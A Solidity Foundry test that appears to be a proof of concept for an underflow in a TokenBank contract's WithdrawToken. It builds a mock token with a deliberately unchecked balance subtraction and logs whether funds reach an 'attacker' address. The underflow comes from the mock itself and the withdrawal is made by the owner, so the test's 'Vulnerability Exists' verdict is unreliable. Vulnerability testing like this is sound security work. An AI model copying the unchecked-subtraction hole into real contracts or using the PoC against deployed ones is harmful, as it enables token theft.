// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol";

contract MaliciousToken {
    mapping(address => uint256) public balances;

    constructor(address bank, uint256 initialSupply) {
        balances[bank] = initialSupply;
    }

    // Vulnerable transfer function that underflows when overspent
    function transfer(address to, uint256 amount) external returns (bool) {
        unchecked {
            // This subtraction will underflow if amount > balances[msg.sender]
            balances[msg.sender] -= amount;
            balances[to] += amount;
        }
        return true;
    }
}

contract TokenBankUnderflowTest is Test {
    TokenBank tokenBank;
    MaliciousToken token;
    address owner = address(0x1);
    address attacker = address(0x2);
    uint256 constant INITIAL_BALANCE = 1 ether;

    function setUp() public {
        vm.startPrank(owner);
        tokenBank = new TokenBank();
        token = new MaliciousToken(address(tokenBank), INITIAL_BALANCE);
        vm.stopPrank();
    }

    function test_WithdrawToken_Underflow() public {
        uint256 overspendAmount = 2 * INITIAL_BALANCE;
        
        console2.log("--- BEFORE-Trigger State ---");
        uint256 initialBankBalance = token.balances(address(tokenBank));
        uint256 initialAttackerBalance = token.balances(attacker);
        console2.log("TokenBank's MaliciousToken balance:", initialBankBalance);
        console2.log("Attacker's MaliciousToken balance:", initialAttackerBalance);

        console2.log("--- Trigger Action: WithdrawToken ---");
        vm.prank(owner);
        tokenBank.WithdrawToken(address(token), overspendAmount, attacker);

        console2.log("--- AFTER-Trigger State ---");
        uint256 finalBankBalance = token.balances(address(tokenBank));
        uint256 finalAttackerBalance = token.balances(attacker);
        console2.log("TokenBank's MaliciousToken balance:", finalBankBalance);
        console2.log("Attacker's MaliciousToken balance:", finalAttackerBalance);
        
        // Expected underflow result calculation
        uint256 expectedBankBalance = type(uint256).max - overspendAmount + initialBankBalance + 1;
        bool underflowOccurred = finalBankBalance == expectedBankBalance;
        bool tokensTransferred = finalAttackerBalance == overspendAmount;
        bool vulnerabilityExploited = underflowOccurred && tokensTransferred;
        
        console2.log("--- Vulnerability Verification ---");
        console2.log("Underflow occurred (bank balance wrapped):", underflowOccurred ? "YES" : "NO");
        console2.log("Attacker received full tokens:", tokensTransferred ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Underflow vulnerability enabled token theft via negative balances");
        } else {
            if (!underflowOccurred) console2.log("Failure reason: Bank balance not wrapped as expected");
            if (!tokensTransferred) console2.log("Failure reason: Attacker didn't receive full tokens");
            console2.log("Vulnerability not Exist: Underflow conditions not fully met");
        }
    }
}